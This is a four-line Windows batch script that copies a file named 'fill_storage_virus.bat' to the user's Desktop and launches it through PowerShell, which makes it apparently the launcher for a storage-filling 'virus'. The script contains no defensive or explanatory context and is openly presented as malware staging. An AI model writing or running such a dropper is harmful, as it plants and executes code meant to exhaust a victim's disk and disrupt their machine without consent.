@echo off
copy fill_storage_virus.bat C:\Users\%USERNAME%\Desktop
powershell.exe -noexi "cd C:\Users\%USERNAME%\Desktop; fill_storage_virus.bat"
exit